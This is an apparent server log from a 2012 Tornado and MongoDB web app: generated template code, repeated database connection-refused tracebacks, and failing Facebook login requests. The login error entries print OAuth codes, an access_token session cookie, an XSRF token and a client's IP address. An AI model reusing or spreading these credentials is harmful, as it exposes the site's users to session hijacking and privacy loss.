66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
WARNING:root:404 GET /h (127.0.0.1) 0.75ms
WARNING:root:404 GET /# (127.0.0.1) 0.79ms
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
            return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    .ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
      File "/www/virtualenv/intheory/src/app.py", line 89, in <module>
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
connect(db_name, host=db_host)
      File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
ERROR:root:Uncaught exception GET /login?code=AQAaqUp1mch3r3PPB01nQKHqbOUVbHq2eBbAtBDlrdIuLwJP7JE8v8fMTlSqNZpWOSMvwXqY0RGp0SIuK0zkN7xuhjn-XrToJ08lXusa_pv4SUXT9mAmzQp5DkimrVIQq4_CeiMddM8_3yZE2LGNrS7bVbXgNmo5gn9GqQg69TVdIma5DiTQcviawdNxYG4skl1OXtgyGV46g8aDd_dxv8Xf (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login?code=AQAaqUp1mch3r3PPB01nQKHqbOUVbHq2eBbAtBDlrdIuLwJP7JE8v8fMTlSqNZpWOSMvwXqY0RGp0SIuK0zkN7xuhjn-XrToJ08lXusa_pv4SUXT9mAmzQp5DkimrVIQq4_CeiMddM8_3yZE2LGNrS7bVbXgNmo5gn9GqQg69TVdIma5DiTQcviawdNxYG4skl1OXtgyGV46g8aDd_dxv8Xf', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; access_token="QUFBRzZsTmNzNkdjQkFGWkJ0N2lyT1VNZXdIdHlaQmdqVXlwd3laQlU0cE9yOUhqaGpUYzV5R0JreElweUJQd1hmamVja1Z6ZFJqWkJGSnpwTXVWWkFMUFJ1dm5uYkFWYmVaQWtMa1lFVjFVUVpEWkQ=|1348501301|3d64eb49fde5ef5d8b6f201ffcd7de60a8a150f4"; __utma=188782963.1731359073.1348049186.1348501288.1348566979.7; __utmb=188782963.2.10.1348566979; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 49, in _on_login
    c_user = User.objects(fb_id=user['id']).get()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 796, in get
    self.limit(2)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 1101, in limit
    self._cursor.limit(n)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 583, in _cursor
    self._cursor_obj = self._collection.find(self._query,
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 564, in _collection
    self._ensure_indexes()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 476, in _ensure_indexes
    if index_types and '_types' in self._query and not types_indexed:
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 379, in _query
    self._mongo_query = self._query_obj.to_query(self._document)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 205, in to_query
    query = query.accept(QueryCompilerVisitor(document))
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 270, in accept
    return visitor.visit_query(self)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 162, in visit_query
    return QuerySet._transform_query(self.document, **query.query)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 701, in _transform_query
    fields = QuerySet._lookup_field(_doc_cls, parts)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 639, in _lookup_field
    % field_name)
InvalidQueryError: Cannot resolve field "fb_id"
ERROR:root:500 GET /login?code=AQAaqUp1mch3r3PPB01nQKHqbOUVbHq2eBbAtBDlrdIuLwJP7JE8v8fMTlSqNZpWOSMvwXqY0RGp0SIuK0zkN7xuhjn-XrToJ08lXusa_pv4SUXT9mAmzQp5DkimrVIQq4_CeiMddM8_3yZE2LGNrS7bVbXgNmo5gn9GqQg69TVdIma5DiTQcviawdNxYG4skl1OXtgyGV46g8aDd_dxv8Xf (127.0.0.1) 971.22ms
ERROR:root:Uncaught exception GET /login?code=AQAaqUp1mch3r3PPB01nQKHqbOUVbHq2eBbAtBDlrdIuLwJP7JE8v8fMTlSqNZpWOSMvwXqY0RGp0SIuK0zkN7xuhjn-XrToJ08lXusa_pv4SUXT9mAmzQp5DkimrVIQq4_CeiMddM8_3yZE2LGNrS7bVbXgNmo5gn9GqQg69TVdIma5DiTQcviawdNxYG4skl1OXtgyGV46g8aDd_dxv8Xf (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login?code=AQAaqUp1mch3r3PPB01nQKHqbOUVbHq2eBbAtBDlrdIuLwJP7JE8v8fMTlSqNZpWOSMvwXqY0RGp0SIuK0zkN7xuhjn-XrToJ08lXusa_pv4SUXT9mAmzQp5DkimrVIQq4_CeiMddM8_3yZE2LGNrS7bVbXgNmo5gn9GqQg69TVdIma5DiTQcviawdNxYG4skl1OXtgyGV46g8aDd_dxv8Xf', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; access_token="QUFBRzZsTmNzNkdjQkFGWkJ0N2lyT1VNZXdIdHlaQmdqVXlwd3laQlU0cE9yOUhqaGpUYzV5R0JreElweUJQd1hmamVja1Z6ZFJqWkJGSnpwTXVWWkFMUFJ1dm5uYkFWYmVaQWtMa1lFVjFVUVpEWkQ=|1348501301|3d64eb49fde5ef5d8b6f201ffcd7de60a8a150f4"; __utma=188782963.1731359073.1348049186.1348501288.1348566979.7; __utmb=188782963.2.10.1348566979; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 49, in _on_login
    c_user = User.objects(fb_id=user['id']).get()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 796, in get
    self.limit(2)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 1101, in limit
    self._cursor.limit(n)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 583, in _cursor
    self._cursor_obj = self._collection.find(self._query,
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 564, in _collection
    self._ensure_indexes()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 476, in _ensure_indexes
    if index_types and '_types' in self._query and not types_indexed:
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 379, in _query
    self._mongo_query = self._query_obj.to_query(self._document)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 205, in to_query
    query = query.accept(QueryCompilerVisitor(document))
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 270, in accept
    return visitor.visit_query(self)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 162, in visit_query
    return QuerySet._transform_query(self.document, **query.query)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 701, in _transform_query
    fields = QuerySet._lookup_field(_doc_cls, parts)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 639, in _lookup_field
    % field_name)
InvalidQueryError: Cannot resolve field "fb_id"
ERROR:root:500 GET /login?code=AQAaqUp1mch3r3PPB01nQKHqbOUVbHq2eBbAtBDlrdIuLwJP7JE8v8fMTlSqNZpWOSMvwXqY0RGp0SIuK0zkN7xuhjn-XrToJ08lXusa_pv4SUXT9mAmzQp5DkimrVIQq4_CeiMddM8_3yZE2LGNrS7bVbXgNmo5gn9GqQg69TVdIma5DiTQcviawdNxYG4skl1OXtgyGV46g8aDd_dxv8Xf (127.0.0.1) 990.14ms
ERROR:root:Uncaught exception GET /login?code=AQD8t6ZMuNwKUU710XqKlhjNCEhAK06YrO3u4LwUYZWp6pmMOsyDBQQjdx654XSvfIU7rWJybY5H8mum_6heqjXgfl2-CBlkmkL4jIPVKL17qZTICQLSIRyweWkJKG9Y6B4i-1D234hw5Du4ih48L8cwZ7gJ2aD9tD2IkJ-DQ9l2cJYh82ntWs1Vcqlvu1ut80rZVqFACyxemICIpyzmXpDi (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login?code=AQD8t6ZMuNwKUU710XqKlhjNCEhAK06YrO3u4LwUYZWp6pmMOsyDBQQjdx654XSvfIU7rWJybY5H8mum_6heqjXgfl2-CBlkmkL4jIPVKL17qZTICQLSIRyweWkJKG9Y6B4i-1D234hw5Du4ih48L8cwZ7gJ2aD9tD2IkJ-DQ9l2cJYh82ntWs1Vcqlvu1ut80rZVqFACyxemICIpyzmXpDi', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; access_token="QUFBRzZsTmNzNkdjQkFGWkJ0N2lyT1VNZXdIdHlaQmdqVXlwd3laQlU0cE9yOUhqaGpUYzV5R0JreElweUJQd1hmamVja1Z6ZFJqWkJGSnpwTXVWWkFMUFJ1dm5uYkFWYmVaQWtMa1lFVjFVUVpEWkQ=|1348501301|3d64eb49fde5ef5d8b6f201ffcd7de60a8a150f4"; __utma=188782963.1731359073.1348049186.1348501288.1348566979.7; __utmb=188782963.3.10.1348566979; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 49, in _on_login
    c_user = User.objects(fb_id=user['id']).get()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 796, in get
    self.limit(2)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 1101, in limit
    self._cursor.limit(n)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 583, in _cursor
    self._cursor_obj = self._collection.find(self._query,
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 379, in _query
    self._mongo_query = self._query_obj.to_query(self._document)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 205, in to_query
    query = query.accept(QueryCompilerVisitor(document))
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 270, in accept
    return visitor.visit_query(self)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 162, in visit_query
    return QuerySet._transform_query(self.document, **query.query)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 701, in _transform_query
    fields = QuerySet._lookup_field(_doc_cls, parts)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 639, in _lookup_field
    % field_name)
InvalidQueryError: Cannot resolve field "fb_id"
ERROR:root:500 GET /login?code=AQD8t6ZMuNwKUU710XqKlhjNCEhAK06YrO3u4LwUYZWp6pmMOsyDBQQjdx654XSvfIU7rWJybY5H8mum_6heqjXgfl2-CBlkmkL4jIPVKL17qZTICQLSIRyweWkJKG9Y6B4i-1D234hw5Du4ih48L8cwZ7gJ2aD9tD2IkJ-DQ9l2cJYh82ntWs1Vcqlvu1ut80rZVqFACyxemICIpyzmXpDi (127.0.0.1) 865.82ms
ERROR:root:Uncaught exception GET /login?code=AQD8t6ZMuNwKUU710XqKlhjNCEhAK06YrO3u4LwUYZWp6pmMOsyDBQQjdx654XSvfIU7rWJybY5H8mum_6heqjXgfl2-CBlkmkL4jIPVKL17qZTICQLSIRyweWkJKG9Y6B4i-1D234hw5Du4ih48L8cwZ7gJ2aD9tD2IkJ-DQ9l2cJYh82ntWs1Vcqlvu1ut80rZVqFACyxemICIpyzmXpDi (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login?code=AQD8t6ZMuNwKUU710XqKlhjNCEhAK06YrO3u4LwUYZWp6pmMOsyDBQQjdx654XSvfIU7rWJybY5H8mum_6heqjXgfl2-CBlkmkL4jIPVKL17qZTICQLSIRyweWkJKG9Y6B4i-1D234hw5Du4ih48L8cwZ7gJ2aD9tD2IkJ-DQ9l2cJYh82ntWs1Vcqlvu1ut80rZVqFACyxemICIpyzmXpDi', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; __utma=188782963.1731359073.1348049186.1348501288.1348566979.7; __utmb=188782963.3.10.1348566979; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
